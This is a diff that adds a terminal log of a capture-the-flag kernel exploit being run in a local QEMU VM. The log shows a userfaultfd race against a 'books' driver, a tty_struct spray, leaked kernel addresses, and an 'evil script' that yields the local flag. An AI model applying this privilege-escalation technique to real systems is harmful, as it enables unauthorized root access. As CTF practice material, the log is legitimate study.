@@ -1,0 +1,45 @@
+[+] starting exploit localy...
+c[?7l[2J[0mSeaBIOS (version 1.13.0-1ubuntu1.1)
+
+
+iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+07F8C8B0+07ECC8B0 CA00
+Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               
+
+
+Booting from ROM...
+c[?7l[2JSpectre V2 : Spectre mitigation: kernel not compiled with retpoline; no mitigation available!
+Boot took 0.64 seconds
+~ $ id
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+~ $ cat /fla~ $ cat /flag.txt [J
+cat: can't open '/flag.txt': Permission denied
+~ $ /tm~ $ /tmp/[Jexp~ $ /tmp/exploit [J
+[getdesc] registering uffd-visor.
+[getdesc] mmapping...
+[getdesc] mmapped @ 0x40000 - 0x41000
+[getdesc] registered uffd visor.
+[getdesc] entered fault_handler_thread
+[getdesc] polling...
+[!getdesc] page fault @ 0x40000
+[+] removing all books.
+[+] allocating tty_struct...
+[getdesc] copying from 0x4e33c0 to faulted page.
+[!] kbase: 0xffffffffb4a00000
+[!] tty_struct : 0xffffa0d4872a8800
+[adddesc] registering uffd-visor.
+[adddesc] mmapping...
+[adddesc] mmapped @ 0x50000 - 0x51000
+[adddesc] registered uffd visor.
+[getdesc] exiting fault_handler_thrd
+[adddesc] entered fault_handler_thread
+[adddesc] polling...
+[!adddesc] page fault @ 0x50000
+[+] removing all books.
+[+] allocating tty_struct...
+[adddesc] copying from 0x4e33c0 to faulted page.
+[+] calling tty ioctl...
+[+] executing evil script...
+[adddesc] exiting fault_handler_thrd
+/tmp/nirugiri: line 1: ÿÿÿÿ: not found
+3k{root_the_machine_remotely_for_the_real_flag}
+[ ] END of life...
